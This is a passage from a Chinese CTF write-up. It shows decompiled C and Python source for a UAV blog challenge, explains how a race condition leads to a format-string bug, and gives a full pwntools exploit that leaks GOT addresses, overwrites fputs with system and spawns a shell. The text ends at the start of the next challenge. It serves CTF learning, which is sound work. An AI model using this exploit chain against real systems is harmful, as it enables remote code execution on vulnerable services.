            fprintf(stdout, "Open file error!n");
            fprintf(stdout, "Byen");
            fflush(stdout);
            exit(0);
        }
        fprintf(fp, "%s", content);
        fclose(fp);
        fp = fopen("filelog.txt", "a+");
        fprintf(fp, "%sn", filename);
        fclose(fp);
    }
    void read_blog()
    {
        char filename[255] = {0};
        char content[2048];
        char c;
        int flag;
        flag = 1;
        FILE *fp;
        int i;
        i = 0;
        fprintf(stdout, "Please input blog name: n");
        fflush(stdout);
        while(1)
        {
            c = getchar();
            if((c==10)||(i>=200)||(flag != 1))
            {
                break;
            }
            if(check_vaild(c))
            {
                filename[i] = c;
            }else{
                exit(0);
            }
            i += 1;
        }
        filename[i+1] = 0;
        if(list_blog(filename))
        {
            fp = fopen(filename, "r");
            if (fp == NULL)
            {
                fprintf(stdout, "Open file error!n");
                fprintf(stdout, "Byen");
                fflush(stdout);
                exit(0);
            }
            int count = 0;
            while (!feof(fp))
            {
                c = fgetc(fp);
                content[count] = c;
                count += 1;
            }
            content[count] = 0;
            fclose(fp);
            fprintf(stdout, content);
            fflush(stdout);
            fprintf(stdout, "n");
            fflush(stdout);
        }
        else
        {
            fprintf(stdout, "Blog not exist!n");
            fprintf(stdout, "Bye!n");
            fflush(stdout);
        }
    }
    int list_blog(char *s)
    {
        FILE *fp;
        char *line = NULL;
        size_t len = 0;
        ssize_t read;
        fp = fopen("filelog.txt", "r");
        if (fp == NULL)
        {
            fprintf(stdout, "Open file error!n");
            fprintf(stdout, "Byen");
            fflush(stdout);
            exit(0);
        }
        int cmp, flag;
        cmp = strcmp("main", s);
        flag = 0;
        char tmp_str[20];
        memset(tmp_str,0,20);
        if(cmp == 0)
        {
            fprintf(stdout, "----- Blog List -----n");
            fflush(stdout);
        }
        while ((read = getline(&line, &len, fp)) != -1) 
        {
            if(cmp == 0)
            {
                fprintf(stdout, "%s", line);
                fflush(stdout);
            }
            else
            {
                strncpy(tmp_str, line, 13);
                if(!strcmp(tmp_str, s))
                {
                    flag = 1;
                    return 1;
                }
            }
        }
        if(cmp == 0)
        {
            fprintf(stdout, "---------------------n");
            fflush(stdout);
        }
        fclose(fp);
        return 0;
    }
    int main()
    {
        int choice;
        while(1)
        {
            choice = menu();    
            switch(choice)
            {
                case 1:
                    list_blog("main");
                    break;
                case 2:
                    write_blog();
                    break;
                case 3:
                    read_blog();
                    break;
                case 4:
                    return 0;
            }
        }
        return 0;
    }
    反编译Blog-py
    import time
    import os
    import sys
    class flushfile(object):
        def __init__(self, f):
            self.f = f
        def write(self, x):
            self.f.write(x)
            self.f.flush()
    sys.stdout = flushfile(sys.stdout)
    def gen_id():
        now = int(time.time())
        return '%d.em' % now
    def list_blog():
        l = []
        f = open('bloglist.txt', 'r')
        l = [ x.strip() for x in f ]
        f.close()
        return l
    def write_blog():
        content = raw_input('Please input blog content: n')
        filename = gen_id()
        fw = open(filename, 'a+')
        fw.write(content)
        fw.close()
        while True:
            try:
                f = open('bloglist.txt', 'a+')
                break
            except:
                pass
        f.write(filename + 'n')
        f.close()
    def read_blog():
        filename = raw_input('Please input blog name: n')
        filename = filename.strip()
        if filename not in list_blog():
            if not os.path.exists(filename):
                print 'File not exist!'
                return
        fr = open(filename, 'r')
        content = fr.read()
        fr.close()
        print content
    def menu():
        print '---- UAV Pilot Blog Version 2.0 ----'
        print '   1. List Blog'
        print '   2. Write Blog'
        print '   3. Read Blog'
        print '   4. Exit'
        print '------------------------------------'
        return raw_input('Your choice: n')
    def main():
        choice = int(menu())
        if choice == 1:
            print '-- File List --'
            for x in list_blog():
                print x
            print '---------------'
        if choice == 2:
            write_blog()
        if choice == 3:
            read_blog()
        if choice == 4:
            exit()
    if __name__ == '__main__':
        os.chdir('/tmp/pwn/')
        while True:
            main()
**漏洞分析**
可以看到bin文件对文件名和内容进行了严格的过滤，但是py文件并没有过滤，可以通过race
condition请求bin和py文件来修改xxxx.em的内容，在read_blog函数读取文件内容并显示输出的时候即可达到格式化字符串的目的fprintf(stdout,
content);
第一次race然后格式化可以到达info
leak泄漏got表，第二次race在格式化可以修改fputs.got表，然后在write_blog函数中getshell(fputs(v7,
stream)ida中)
**本地测试**
本地socat 4444端口是bin，socat 6666端口是py
    socat tcp-l:6666,reuseaddr,fork exec:./run_blog 
    socat tcp-l:4444,reuseaddr,fork exec:./Blog-bin
**exp(代码有段乱)**
    # -*-coding:utf-8-*-    __author__ = '0x9k'
    from pwn import *
    import time
    from libformatstr import FormatStr
    fputs_got = 0x0804B05C
    r = remote("172.16.33.144", 4444)#pwn
    #context.log_level = "debug"
    #race condition
    print r.recvuntil("choice: ")
    r.sendline("2")
    print r.recvuntil("content: n")
    payload = "x00"
    r.sendline(payload)
    joker_time = int(time.time())
    r1 = remote("172.16.33.144", 6666)#python
    print r1.recvuntil("choice: ")
    r1.sendline("2")
    print r1.recvuntil("content:")
    payload = p32(fputs_got)
    payload += "%74$s"#leak fputs_got
    r1.sendline(payload)
    joker_time = int(time.time())
    print r1.recvuntil("choice:")
    r1.sendline("4")
    r1.close()
    #race condition
    #format_vuln
    print r.recvuntil("choice:")
    r.sendline("3")
    payload = str(joker_time) + ".emx00"
    print joker_time
    raw_input("joker")
    print r.recvuntil("name: n")
    r.sendline(payload)
    #format_vuln
    content = r.recvuntil("n").replace("n","")
    fputs_addr = u32(content[-5:-1])
    print "[*] fputs addr:{0}".format(hex(fputs_addr))
    system_offset = 0x00040310#local
    fputs_offset = 0x00064230#local
    system_addr = fputs_addr - fputs_offset + system_offset
    print "[*] system addr:{0}".format(hex(system_addr))
    #race condition
    print r.recvuntil("choice: ")
    r.sendline("2")
    print r.recvuntil("content: n")
    payload = "x00"
    r.sendline(payload)
    joker_time = int(time.time())
    p = FormatStr()
    p[fputs_got] = system_addr
    payload = p.payload(74,start_len =0x0)
    r1 = remote("172.16.33.144", 6666)#python
    print r1.recvuntil("choice: ")
    r1.sendline("2")
    print r1.recvuntil("content:")
    r1.sendline(payload)
    joker_time = int(time.time())
    print r1.recvuntil("choice:")
    r1.sendline("4")
    r1.close()
    #race condition
    #format_vuln
    raw_input("joker")
    print r.recvuntil("choice:")
    r.sendline("3")
    payload = str(joker_time) + ".emx00"
    print joker_time
    raw_input("joker")
    print r.recvuntil("name: n")
    r.sendline(payload)
    #format_vuln
    print r.recvuntil("choice:")
    r.sendline("2")
    print r.recvuntil("content: n")
    payload = "shx00"
    r.sendline(payload)
    joker_time = int(time.time())
    r.interactive()
**题目4：无人机的图像解码器**
* * *
**描述：** 这个无人机有一点微小的不同，就是它配备了一个图像解码器，而Flag就藏在解码器里面。
**端口：** 6163
题目开启了端口6061,提供了一个文件ImageDecoder文件，模拟了图片decode，源码如下
    ##source code
    #include 
    #include 
    #include 